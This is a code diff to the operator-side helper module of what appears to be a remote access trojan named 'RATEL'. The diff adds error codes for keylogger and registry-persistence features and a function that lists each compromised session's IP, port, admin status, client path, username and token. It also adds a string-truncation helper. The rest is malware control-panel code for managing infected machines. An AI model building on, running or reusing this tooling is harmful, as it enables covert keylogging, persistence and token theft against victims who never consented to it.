@@ -28,10 +28,25 @@ SPLIT = "|SPLIT|"
 
 dict_error_codes = {
     #Global 0-100: 
-    "0":"The operation completed successfully.", # RATEL_ERROR_SUCCESS
-    "1":"The operation failed" # RATEL_ERROR_FAILS
-}
+    "0":"[+] The operation completed successfully.", # RATEL_ERROR_SUCCESS
+    "1":"[-] The operation failed.", # RATEL_ERROR_FAILS.
+    "2":"[-] Access denied.", # RATEL_ERROR_FAILS.
 
+    #KEYLOGGER 101 - 200:
+    "101":"[-] The file is currently being used by the keylogger.", #RATEL_ERROR_FILE_MANIPULATION
+    "102":"[-] Launching the keyboard recording thread failed.", #RATEL_ERROR_THREAD_SENDKEY
+    "103":"[-] The launch of the end of connection listening thread failed.", #RATEL_ERROR_THREAD_RECVDATA
+    "104":"[-] The log file is not present on the machine.", #RATEL_ERROR_THREAD_RECVDATA
+    "105":"[-] Impossible to register data in the registry subkey.", #RATEL_ERROR_SILENCIOUS_NOT_STARTED
+    "106": "[-] The keylogger is running", #RATEL_ERROR_KEYLOGGER_IS_WORKING
+    
+    #PERSISTENCE 201 - 301:
+    "201":"[-] Unable to open the registry key.", #RATEL_ERROR_OPEN_KEY
+    "202":"[-] Impossible to register data in the registry subkey.", #RATEL_ERROR_SET_SUBKEY
+
+    #OTHER 301 - 400:
+    "301":"[-]Cannot change directory."
+}
 def XOREncryption(data,key):
 
     result = ""
@@ -106,6 +121,27 @@ def areYouSure():
         printColor("error","[-] Unknown argument.\n")
         return False
 
+def printAllTargetAllInformation(target=None):
+    #print all target with all information.
+    from .handler import Handler
+    
+    info = "\033[35m" #magenra
+    value = "\033[32m" #green
+    blue = "\033[34m" 
+   
+    print("----------------------------------------------------------\n")
+    for key in Handler.dict_conn.keys():
+        print(info+ " Number of the session: " + value + str(key))
+        print(info+ " Host: " + value + str(Handler.dict_conn[key][NB_IP]))
+        print(info+ " Port: " + value + str(Handler.dict_conn[key][NB_PORT]))
+        print(info+ " Is he alive: " + value + str(Handler.dict_conn[key][NB_ALIVE]))
+        print(info+ " Is he a admin: " + value + str(Handler.dict_conn[key][NB_ADMIN]))
+        print(info+ " Client path: " + value + str(Handler.dict_conn[key][NB_PATH]))
+        print(info+ " Username: " + value + str(Handler.dict_conn[key][NB_USERNAME]))
+        print(info+ " Token: " + value + str(Handler.dict_conn[key][NB_TOKEN]))
+        print(blue) #restore terminal color
+        print("----------------------------------------------------------\n")
+
 
 def printAllTarget():
     #Print all target.
@@ -115,7 +151,7 @@ def printAllTarget():
     ptable.field_names =["Session","IP","Port","Is he alive","Is he admin","Path RAT","Username"] #append title of row.
 
     for key in Handler.dict_conn.keys():
-        ptable.add_row([key,Handler.dict_conn[key][NB_IP],Handler.dict_conn[key][NB_PORT],Handler.dict_conn[key][NB_ALIVE],Handler.dict_conn[key][NB_ADMIN],Handler.dict_conn[key][NB_PATH],Handler.dict_conn[key][NB_USERNAME]])
+        ptable.add_row([key,Handler.dict_conn[key][NB_IP],Handler.dict_conn[key][NB_PORT],Handler.dict_conn[key][NB_ALIVE],Handler.dict_conn[key][NB_ADMIN], checkString(Handler.dict_conn[key][NB_PATH], 80) , checkString(Handler.dict_conn[key][NB_USERNAME], 80) ])
 
     print(Fore.GREEN,(ptable),Fore.BLUE)
 
@@ -123,7 +159,6 @@ def printAllTarget():
 def pingAllTarget(dict_conn,checkconn_objt , number_of_times=int() ,ping_string="is_life?"):
     #ping all the machine is determines whether the machine is alive or dead. 
     from .handler import Handler
-
 
     for key in dict_conn.keys():
                         
@@ -147,6 +182,36 @@ def pingAllTarget(dict_conn,checkconn_objt , number_of_times=int() ,ping_string=
             #connexion is dead no send msg
             pass
 
+def checkString(string_to_test, string_len_max):
+    
+    '''
+    test if the string is too big.
+    If the string is too big it can cause display bugs.
+    '''
+
+    result = ""
+    i = 0
+    string_to_test = str(string_to_test)
+
+    while(True):
+        
+        if(i >= len(string_to_test)): 
+            
+            break
+        
+        elif(i >= string_len_max):
+            break
+        
+        else:
+            try:
+                result += string_to_test[i]
+            except IndexError as e:
+                #print("-->",e)
+                break
+            else:
+                i+= 1
+
+    return result
 
 def myBanner():
     return """
